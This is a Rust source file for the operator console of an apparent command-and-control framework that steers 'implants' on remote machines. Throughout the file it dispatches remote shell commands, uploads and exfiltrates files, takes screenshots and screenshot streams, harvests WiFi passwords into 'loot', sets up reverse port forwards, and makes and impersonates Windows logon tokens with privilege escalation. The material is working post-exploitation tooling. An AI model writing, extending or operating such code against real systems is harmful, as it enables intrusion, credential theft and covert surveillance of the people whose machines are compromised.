//! Session interaction commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;
use protocol::{FileUploadChunked, FileDownloadChunked};
use ring::digest::{Context, SHA256};

use crate::cli::CliState;
use crate::display::{print_error, print_info, print_success};

const CHUNK_SIZE: usize = 1024 * 1024; // 1MB chunks

/// Execute shell command on implant
pub async fn shell(cli: &CliState, cmd: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Executing: {}", cmd));

    // Dispatch shell task as protobuf-encoded ShellTask
    let shell_task = protocol::ShellTask {
        command: cmd.to_string(),
        shell: None,
        timeout_ms: Some(30000),
    };
    let task_data = shell_task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "shell", task_data).await?;

    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Use 'jobs list' to check status");

    Ok(())
}

/// Upload file to implant
pub async fn upload(cli: &CliState, local: &str, remote: &str) -> Result<()> {
    // Check file size to determine chunked vs simple upload
    let metadata = match std::fs::metadata(local) {
        Ok(m) => m,
        Err(e) => {
            print_error(&format!("Failed to read {}: {}", local, e));
            return Ok(());
        }
    };

    let file_size = metadata.len();
    const CHUNK_THRESHOLD: u64 = 10 * 1024 * 1024; // 10MB

    if file_size > CHUNK_THRESHOLD {
        print_info(&format!("File size {} bytes exceeds threshold, using chunked transfer", file_size));
        return upload_chunked(cli, local, remote).await;
    }

    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    // Read local file
    let data = match std::fs::read(local) {
        Ok(d) => d,
        Err(e) => {
            print_error(&format!("Failed to read {}: {}", local, e));
            return Ok(());
        }
    };

    print_info(&format!("Uploading {} ({} bytes) to {}", local, data.len(), remote));

    // Create upload task as protobuf-encoded FileTask
    let task = protocol::FileTask {
        operation: Some(protocol::file_task::Operation::Upload(protocol::FileUpload {
            remote_path: remote.to_string(),
            data,
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "file", task_data).await?;

    print_success(&format!("Upload task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Download file from implant (automatically uses chunked transfer for large files)
pub async fn download(cli: &CliState, remote: &str, local: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Downloading {} to {}", remote, local));

    // Note: For downloads, we can't know the size ahead of time
    // Always use simple download; implant will use chunked if needed
    let task = protocol::FileTask {
        operation: Some(protocol::file_task::Operation::Download(protocol::FileDownload {
            remote_path: remote.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "file", task_data).await?;

    let task_id_hex = hex::encode(task_id.as_bytes());
    print_success(&format!("Download task dispatched: {}", task_id_hex));
    print_info("Waiting for implant to return file (timeout: 60s)...");

    // Poll for task completion
    let timeout = std::time::Duration::from_secs(60);
    let poll_interval = std::time::Duration::from_secs(2);
    let start = std::time::Instant::now();

    loop {
        tokio::time::sleep(poll_interval).await;

        let task_info = match cli.client.get_task(task_id.as_bytes().to_vec()).await {
            Ok(t) => t,
            Err(e) => {
                print_error(&format!("Failed to poll task status: {}", e));
                return Ok(());
            }
        };

        // TaskStatus::Completed == 3, Failed == 4, Cancelled == 5, Expired == 6
        match task_info.status {
            3 => {
                // Completed — parse result_data as JSON and write bytes to local path
                let json_str = match std::str::from_utf8(&task_info.result_data) {
                    Ok(s) => s,
                    Err(_) => {
                        print_error("Result data is not valid UTF-8");
                        return Ok(());
                    }
                };

                let parsed: serde_json::Value = match serde_json::from_str(json_str) {
                    Ok(v) => v,
                    Err(e) => {
                        print_error(&format!("Failed to parse result JSON: {}", e));
                        return Ok(());
                    }
                };

                // Extract byte array from FileContents.data
                let data_array = parsed
                    .get("FileContents")
                    .and_then(|fc| fc.get("data"))
                    .and_then(|d| d.as_array());

                match data_array {
                    Some(arr) => {
                        let bytes: Vec<u8> = arr
                            .iter()
                            .filter_map(|v| v.as_u64().map(|b| b as u8))
                            .collect();

                        match std::fs::write(local, &bytes) {
                            Ok(_) => {
                                print_success(&format!(
                                    "Downloaded {} bytes to {}",
                                    bytes.len(),
                                    local
                                ));
                            }
                            Err(e) => {
                                print_error(&format!("Failed to write {}: {}", local, e));
                            }
                        }
                    }
                    None => {
                        print_error("Result JSON missing FileContents.data field");
                    }
                }
                return Ok(());
            }
            4 => {
                print_error("Download task failed on implant");
                return Ok(());
            }
            5 => {
                print_error("Download task was cancelled");
                return Ok(());
            }
            6 => {
                print_error("Download task expired before implant checked in");
                return Ok(());
            }
            _ => {
                // Still pending/dispatched — check timeout
                if start.elapsed() >= timeout {
                    print_info(&format!(
                        "Download task still pending, check with 'task show {}'",
                        task_id_hex
                    ));
                    return Ok(());
                }
                // Continue polling
            }
        }
    }
}

/// Change directory on implant (client-side tracking only)
///
/// NOTE: The implant spawns a new subprocess for each shell command, so
/// changing directory via a shell task has no effect on subsequent commands.
/// This function updates the operator's local CWD tracker and warns the user
/// to use full paths in shell commands instead.
pub fn cd(cli: &mut CliState, path: &str) -> Result<()> {
    let session_id = cli.active_session().unwrap().full_id.clone();
    let browser = cli.file_browser_state(&session_id);
    browser.cwd = path.to_string();

    print_info(&format!("Local CWD set to: {}", path));
    print_info("[!] Note: the implant runs each shell command in a new subprocess.");
    print_info("    'cd' does not persist on the implant. Use full paths in shell commands.");

    Ok(())
}

/// Print working directory on implant
pub async fn pwd(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    let task = protocol::ShellTask {
        command: "pwd".to_string(),
        shell: None,
        timeout_ms: Some(10000),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "shell", task_data).await?;

    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// List directory on implant
pub async fn ls(cli: &CliState, path: Option<&str>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    let dir_path = path.unwrap_or(".");
    let task = protocol::FileTask {
        operation: Some(protocol::file_task::Operation::List(protocol::FileList {
            path: dir_path.to_string(),
            recursive: false,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "file", task_data).await?;

    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// List processes on implant
pub async fn ps(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Listing processes...");
    let task = protocol::ProcessTask {
        operation: Some(protocol::process_task::Operation::List(protocol::ProcessListAll {
            include_modules: None,
            include_threads: None,
            name_filter: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "proc", task_data).await?;
    print_success(&format!("Process list task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Results available via 'task show <id>'");

    Ok(())
}

/// Display process tree
pub async fn ps_tree(cli: &CliState, filter: Option<&str>) -> Result<()> {
    use crate::process_tree;

    let session = cli.active_session().unwrap();

    print_info("Building process tree...");

    match cli.client.list_processes(session.full_id.clone(), true, None).await {
        Ok(response) => {
            if response.processes.is_empty() {
                print_info("No processes found");
                return Ok(());
            }

            // Build tree
            let nodes = process_tree::build_tree(&response.processes);

            // Apply filter if provided
            let nodes = if let Some(filter_str) = filter {
                process_tree::filter_tree(&nodes, filter_str)
            } else {
                nodes
            };

            if nodes.is_empty() {
                print_info("No processes match filter");
                return Ok(());
            }

            // Render tree
            let output = process_tree::render_tree(&nodes);
            println!("{}", output);

            if let Some(filter_str) = filter {
                print_info(&format!("{} processes (filtered by '{}')", nodes.len(), filter_str));
            } else {
                print_info(&format!("{} processes", nodes.len()));
            }
        }
        Err(e) => {
            print_error(&format!("Failed to list processes: {}", e));
        }
    }

    Ok(())
}

/// Set implant callback interval
pub async fn sleep(cli: &CliState, seconds: u32) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    let task = protocol::SleepTask {
        interval: seconds,
        jitter: 0,
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "sleep", task_data).await?;

    print_success(&format!("Sleep interval set to {} seconds", seconds));
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Update checkin interval
pub async fn config_interval(cli: &CliState, seconds: u32) -> Result<()> {
    let session = cli.active_session().unwrap();

    print_info(&format!("Updating checkin interval to {} seconds...", seconds));

    match cli.client.update_implant(
        session.full_id.clone(),
        None,
        vec![],
        None,
        Some(seconds),
        None,
    ).await {
        Ok(_) => {
            print_success(&format!("Checkin interval updated to {} seconds", seconds));
            print_info("Change will take effect on next checkin");
        }
        Err(e) => {
            print_error(&format!("Failed to update interval: {}", e));
        }
    }

    Ok(())
}

/// Update jitter percent
pub async fn config_jitter(cli: &CliState, percent: u32) -> Result<()> {
    let session = cli.active_session().unwrap();

    print_info(&format!("Updating jitter to {}%...", percent));

    match cli.client.update_implant(
        session.full_id.clone(),
        None,
        vec![],
        None,
        None,
        Some(percent),
    ).await {
        Ok(_) => {
            print_success(&format!("Jitter updated to {}%", percent));
            print_info("Change will take effect on next checkin");
        }
        Err(e) => {
            print_error(&format!("Failed to update jitter: {}", e));
        }
    }

    Ok(())
}

/// Burn the implant (mark as compromised)
pub async fn burn(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    // Confirm with user
    println!("Are you sure you want to burn this implant? (yes/no)");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;

    if input.trim().to_lowercase() != "yes" {
        print_info("Burn cancelled");
        return Ok(());
    }

    let task_id = cli.client.dispatch_task(implant_id, "burn", vec![]).await?;

    print_success(&format!("Burn task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Take screenshot on implant
pub async fn screenshot(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    let task = protocol::ScreenshotTask {
        monitor: None,
        quality: None,
        format: None,
        include_cursor: None,
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "screenshot", task_data).await?;

    print_success(&format!("Screenshot task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Screenshot will be saved to loot once complete");

    Ok(())
}

/// Upload large file to implant using chunked transfer
pub async fn upload_chunked(cli: &CliState, local: &str, remote: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    // Read local file
    let data = match std::fs::read(local) {
        Ok(d) => d,
        Err(e) => {
            print_error(&format!("Failed to read {}: {}", local, e));
            return Ok(());
        }
    };

    let total_size = data.len() as u64;
    let total_chunks = (total_size as usize + CHUNK_SIZE - 1) / CHUNK_SIZE;
    let transfer_id = uuid::Uuid::new_v4().to_string();

    print_info(&format!(
        "Uploading {} ({} bytes, {} chunks) to {}",
        local, total_size, total_chunks, remote
    ));

    // Send each chunk
    for (chunk_index, chunk_data) in data.chunks(CHUNK_SIZE).enumerate() {
        // Calculate checksum
        let mut context = Context::new(&SHA256);
        context.update(chunk_data);
        let checksum = context.finish();

        let upload = FileUploadChunked {
            transfer_id: transfer_id.clone(),
            remote_path: remote.to_string(),
            total_size,
            chunk_index: chunk_index as u64,
            total_chunks: total_chunks as u64,
            chunk_data: chunk_data.to_vec(),
            checksum: checksum.as_ref().to_vec(),
        };

        let task_data = upload.encode_to_vec();
        let _ = cli
            .client
            .dispatch_task(implant_id, "file_upload_chunked", task_data)
            .await?;

        // Progress indicator
        let progress = ((chunk_index + 1) as f64 / total_chunks as f64) * 100.0;
        print!("\rProgress: {}/{} chunks ({:.1}%)", chunk_index + 1, total_chunks, progress);
        std::io::Write::flush(&mut std::io::stdout())?;
    }

    println!(); // New line after progress
    print_success(&format!("Upload complete: {} chunks dispatched", total_chunks));
    print_info(&format!("Transfer ID: {}", transfer_id));

    Ok(())
}

/// Download large file from implant using chunked transfer
#[allow(dead_code)]
pub async fn download_chunked(cli: &CliState, remote: &str, local: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    let transfer_id = uuid::Uuid::new_v4().to_string();

    print_info(&format!("Downloading {} to {}", remote, local));
    print_info(&format!("Transfer ID: {}", transfer_id));

    // Request first chunk to get total size
    let download = FileDownloadChunked {
        transfer_id: transfer_id.clone(),
        remote_path: remote.to_string(),
        chunk_index: 0,
        chunk_size: CHUNK_SIZE as u64,
    };

    let task_data = download.encode_to_vec();
    let task_id = cli
        .client
        .dispatch_task(implant_id, "file_download_chunked", task_data)
        .await?;

    print_success(&format!("Download initiated: {}", hex::encode(task_id.as_bytes())));
    print_info("Chunks will be delivered as separate tasks");
    print_info(&format!("Use 'transfer status {}' to monitor progress", transfer_id));
    print_info(&format!("Downloaded file will be saved to loot as: {}", local));

    Ok(())
}

/// Enumerate WiFi credentials on implant
pub async fn wifi(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Enumerating WiFi credentials...");

    // WifiModule ignores task_data (calls wifi::harvest() directly),
    // but send a WifiTask for protocol consistency
    let task = protocol::WifiTask {
        include_passwords: true,
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "wifi", task_data).await?;

    print_success(&format!("WiFi enumeration task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Credentials will be saved to loot once complete");

    Ok(())
}

/// Start port forward
pub async fn portfwd_start(
    cli: &CliState,
    bind_port: u32,
    fwd_addr: &str,
    reverse: bool,
) -> Result<()> {
    let session = cli.active_session().unwrap();

    print_info(&format!(
        "Starting {} port forward: {} -> {}",
        if reverse { "reverse" } else { "forward" },
        bind_port,
        fwd_addr
    ));

    // Parse forward address (host:port)
    let parts: Vec<&str> = fwd_addr.split(':').collect();
    if parts.len() != 2 {
        print_error("Forward address must be in format host:port");
        return Ok(());
    }

    let remote_host = parts[0].to_string();
    let remote_port: u32 = match parts[1].parse() {
        Ok(p) => p,
        Err(_) => {
            print_error("Invalid port number");
            return Ok(());
        }
    };

    match cli
        .client
        .start_port_forward(
            session.full_id.clone(),
            "0.0.0.0".to_string(),
            bind_port,
            remote_host,
            remote_port,
            reverse,
        )
        .await
    {
        Ok(response) => {
            if let Some(forward_id) = response.forward_id {
                let id_short = if forward_id.value.len() >= 4 {
                    hex::encode(&forward_id.value[..4])
                } else {
                    hex::encode(&forward_id.value)
                };
                print_success(&format!("Port forward started (ID: {})", id_short));

                if let Some(task_id) = response.task_id {
                    let task_id_short = if task_id.value.len() >= 4 {
                        hex::encode(&task_id.value[..4])
                    } else {
                        hex::encode(&task_id.value)
                    };
                    print_info(&format!("Task ID: {}", task_id_short));
                }
            } else {
                print_success("Port forward started");
            }
        }
        Err(e) => {
            print_error(&format!("Failed to start port forward: {}", e));
        }
    }

    Ok(())
}

/// Stop port forward
pub async fn portfwd_stop(cli: &CliState, forward_id: &str) -> Result<()> {
    let id_bytes = hex::decode(forward_id)
        .map_err(|e| anyhow::anyhow!("Invalid forward ID format (expected hex string): {}", e))?;

    print_info(&format!("Stopping port forward {}...", forward_id));

    match cli.client.stop_port_forward(id_bytes).await {
        Ok(success) => {
            if success {
                print_success(&format!("Port forward {} stopped", forward_id));
            } else {
                print_error(&format!("Failed to stop port forward {}", forward_id));
            }
        }
        Err(e) => {
            print_error(&format!("Failed to stop port forward: {}", e));
        }
    }

    Ok(())
}

/// List port forwards
pub async fn portfwd_list(cli: &CliState) -> Result<()> {
    use crate::theme::Theme;
    use comfy_table::{presets::UTF8_FULL, Cell, Color, ContentArrangement, Table};

    let session = cli.active_session().unwrap();

    let response = cli
        .client
        .list_proxies(Some(session.full_id.clone()))
        .await?;

    if response.port_forwards.is_empty() {
        print_info("No active port forwards");
        return Ok(());
    }

    let mut table = Table::new();
    table
        .load_preset(UTF8_FULL)
        .set_content_arrangement(ContentArrangement::Dynamic);

    // Headers
    if Theme::is_interactive() {
        table.set_header(vec![
            Cell::new("ID").fg(Color::Rgb {
                r: 203,
                g: 166,
                b: 247,
            }),
            Cell::new("Local").fg(Color::Rgb {
                r: 203,
                g: 166,
                b: 247,
            }),
            Cell::new("Remote").fg(Color::Rgb {
                r: 203,
                g: 166,
                b: 247,
            }),
            Cell::new("Type").fg(Color::Rgb {
                r: 203,
                g: 166,
                b: 247,
            }),
            Cell::new("Bytes In").fg(Color::Rgb {
                r: 203,
                g: 166,
                b: 247,
            }),
            Cell::new("Bytes Out").fg(Color::Rgb {
                r: 203,
                g: 166,
                b: 247,
            }),
            Cell::new("State").fg(Color::Rgb {
                r: 203,
                g: 166,
                b: 247,
            }),
        ]);
    } else {
        table.set_header(vec!["ID", "Local", "Remote", "Type", "Bytes In", "Bytes Out", "State"]);
    }

    // Helper function to format bytes
    fn format_bytes(bytes: u64) -> String {
        if bytes < 1024 {
            format!("{} B", bytes)
        } else if bytes < 1024 * 1024 {
            format!("{:.2} KB", bytes as f64 / 1024.0)
        } else if bytes < 1024 * 1024 * 1024 {
            format!("{:.2} MB", bytes as f64 / (1024.0 * 1024.0))
        } else {
            format!("{:.2} GB", bytes as f64 / (1024.0 * 1024.0 * 1024.0))
        }
    }

    // Rows
    for forward in &response.port_forwards {
        let id_short = if let Some(ref id) = forward.id {
            if id.value.len() >= 4 {
                hex::encode(&id.value[..4])
            } else {
                hex::encode(&id.value)
            }
        } else {
            "unknown".to_string()
        };

        let local = format!("{}:{}", forward.local_host, forward.local_port);
        let remote = format!("{}:{}", forward.remote_host, forward.remote_port);
        let fwd_type = if forward.reverse { "reverse" } else { "forward" };

        let bytes_in_str = format_bytes(forward.bytes_in);
        let bytes_out_str = format_bytes(forward.bytes_out);

        let state = match forward.state {
            0 => "unknown",
            1 => "starting",
            2 => "active",
            3 => "stopped",
            4 => "error",
            _ => "unknown",
        };

        table.add_row(vec![
            id_short,
            local,
            remote,
            fwd_type.to_string(),
            bytes_in_str,
            bytes_out_str,
            state.to_string(),
        ]);
    }

    println!("{table}");
    print_info(&format!("{} active port forwards", response.port_forwards.len()));

    Ok(())
}

/// Push directory onto stack and change to new path
pub fn pushd(cli: &mut CliState, path: &str) -> Result<()> {
    let session_id = cli.active_session().unwrap().full_id.clone();

    // Get file browser state and push current directory
    let browser = cli.file_browser_state(&session_id);
    if !browser.cwd.is_empty() {
        browser.dir_stack.push(browser.cwd.clone());
    }
    browser.cwd = path.to_string();

    print_info(&format!("Local CWD set to: {}", path));
    print_info("[!] Note: the implant runs each shell command in a new subprocess.");
    print_info("    'cd' does not persist on the implant. Use full paths in shell commands.");

    Ok(())
}

/// Pop directory from stack and return to it
pub fn popd(cli: &mut CliState) -> Result<()> {
    let session_id = cli.active_session().unwrap().full_id.clone();

    // Get file browser state and pop directory
    let prev_dir = {
        let browser = cli.file_browser_state(&session_id);
        browser.popd()
    };

    match prev_dir {
        Some(dir) => {
            let browser = cli.file_browser_state(&session_id);
            browser.cwd = dir.clone();
            print_info(&format!("Local CWD set to: {}", dir));
            print_info("[!] Note: the implant runs each shell command in a new subprocess.");
            print_info("    'cd' does not persist on the implant. Use full paths in shell commands.");
            Ok(())
        }
        None => {
            print_error("Directory stack is empty");
            Ok(())
        }
    }
}

/// Start continuous screenshot capture
pub async fn screenshot_stream(cli: &CliState, interval_ms: u32, quality: Option<u32>, max_frames: Option<u32>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!(
        "Starting screenshot stream: interval={}ms quality={} max_frames={}",
        interval_ms,
        quality.unwrap_or(80),
        max_frames.map(|f| f.to_string()).unwrap_or_else(|| "unlimited".to_string()),
    ));

    // ScreenshotStreamModule decodes ScreenshotTask (not ScreenshotStreamTask);
    // it reads monitor field as max_frames, quality as quality
    let task = protocol::ScreenshotTask {
        monitor: max_frames.or(Some(10)),
        quality,
        format: None,
        include_cursor: None,
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "screenshot_stream", task_data).await?;
    print_success(&format!("Screenshot stream task dispatched: {}", hex::encode(task_id.as_bytes())));
    Ok(())
}

/// Create a new logon token
pub async fn token_make(cli: &CliState, username: &str, password: &str, domain: Option<&str>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    let dom = domain.unwrap_or(".");
    print_info(&format!("Creating token: {}\\{}", dom, username));

    let task = protocol::TokenTask {
        operation: Some(protocol::token_task::Operation::Make(protocol::TokenMake {
            username: username.to_string(),
            password: password.to_string(),
            domain: Some(dom.to_string()),
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "token", task_data).await?;
    print_success(&format!("Token make task dispatched: {}", hex::encode(task_id.as_bytes())));
    Ok(())
}

/// Impersonate an existing token by ID
pub async fn token_impersonate(cli: &CliState, token_id: u32) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Impersonating token ID: {}", token_id));

    let task = protocol::TokenTask {
        operation: Some(protocol::token_task::Operation::Impersonate(protocol::TokenImpersonate {
            token_id,
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "token", task_data).await?;
    print_success(&format!("Token impersonate task dispatched: {}", hex::encode(task_id.as_bytes())));
    Ok(())
}

/// Enable a privilege on the current token
pub async fn token_enable_priv(cli: &CliState, priv_name: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Enabling privilege: {}", priv_name));

    let task = protocol::TokenTask {
        operation: Some(protocol::token_task::Operation::EnablePriv(protocol::TokenEnablePriv {
            privilege: priv_name.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "token", task_data).await?;
    print_success(&format!("Token enable-priv task dispatched: {}", hex::encode(task_id.as_bytes())));
    Ok(())
}

/// List all tokens stored in the implant's token store
pub async fn token_list(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Listing stored tokens...");

    let task = protocol::TokenTask {
        operation: Some(protocol::token_task::Operation::List(protocol::TokenList {})),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "token", task_data).await?;
    print_success(&format!("Token list task dispatched: {}", hex::encode(task_id.as_bytes())));
    Ok(())
}

/// Show directory stack contents
pub fn dirs(cli: &mut CliState) {
    let session_id = cli.active_session().unwrap().full_id.clone();

    let browser = cli.file_browser_state(&session_id);

    // Print current working directory
    if !browser.cwd.is_empty() {
        print_info(&format!("Current: {}", browser.cwd));
    } else {
        print_info("Current: (unknown)");
    }

    // Print directory stack (most recent first)
    if !browser.dir_stack.is_empty() {
        print_info("Stack:");
        for (idx, dir) in browser.dir_stack.iter().rev().enumerate() {
            println!("  {} {}", idx, dir);
        }
    } else {
        print_info("Stack is empty");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_chunk_size_constant() {
        assert_eq!(CHUNK_SIZE, 1024 * 1024); // 1MB
    }

    #[test]
    fn test_chunk_calculation() {
        // Test exact multiple
        let data_5mb = vec![0u8; 5 * 1024 * 1024];
        let chunks: Vec<_> = data_5mb.chunks(CHUNK_SIZE).collect();
        assert_eq!(chunks.len(), 5);

        // Test non-exact multiple
        let data_5_5mb = vec![0u8; 5 * 1024 * 1024 + 512 * 1024];
        let chunks: Vec<_> = data_5_5mb.chunks(CHUNK_SIZE).collect();
        assert_eq!(chunks.len(), 6);
        assert_eq!(chunks[5].len(), 512 * 1024);
    }

    #[test]
    fn test_checksum_generation() {
        let test_data = b"test data for checksum";
        let mut context = Context::new(&SHA256);
        context.update(test_data);
        let checksum = context.finish();

        // SHA256 always produces 32 bytes
        assert_eq!(checksum.as_ref().len(), 32);

        // Same data produces same checksum
        let mut context2 = Context::new(&SHA256);
        context2.update(test_data);
        let checksum2 = context2.finish();
        assert_eq!(checksum.as_ref(), checksum2.as_ref());

        // Different data produces different checksum
        let mut context3 = Context::new(&SHA256);
        context3.update(b"different data");
        let checksum3 = context3.finish();
        assert_ne!(checksum.as_ref(), checksum3.as_ref());
    }

    #[test]
    fn test_protobuf_encoding() {
        let upload = FileUploadChunked {
            transfer_id: "test-123".to_string(),
            remote_path: "/tmp/test.bin".to_string(),
            total_size: 1000,
            chunk_index: 0,
            total_chunks: 1,
            chunk_data: vec![1, 2, 3, 4],
            checksum: vec![0u8; 32],
        };

        // Encode to bytes
        let encoded = upload.encode_to_vec();
        assert!(!encoded.is_empty());

        // Decode back
        let decoded = FileUploadChunked::decode(&encoded[..]).unwrap();
        assert_eq!(decoded.transfer_id, "test-123");
        assert_eq!(decoded.remote_path, "/tmp/test.bin");
        assert_eq!(decoded.total_size, 1000);
        assert_eq!(decoded.chunk_data, vec![1, 2, 3, 4]);
    }

    #[test]
    fn test_chunk_progress_calculation() {
        let total_chunks = 100;

        // First chunk
        let progress = (1 as f64 / total_chunks as f64) * 100.0;
        assert_eq!(progress, 1.0);

        // Middle chunk
        let progress = (50 as f64 / total_chunks as f64) * 100.0;
        assert_eq!(progress, 50.0);

        // Last chunk
        let progress = (100 as f64 / total_chunks as f64) * 100.0;
        assert_eq!(progress, 100.0);
    }

    #[test]
    fn test_upload_threshold() {
        const CHUNK_THRESHOLD: u64 = 10 * 1024 * 1024; // 10MB

        // Files under threshold use simple upload
        assert!(5 * 1024 * 1024 < CHUNK_THRESHOLD);

        // Files over threshold use chunked upload
        assert!(15 * 1024 * 1024 > CHUNK_THRESHOLD);
    }
}
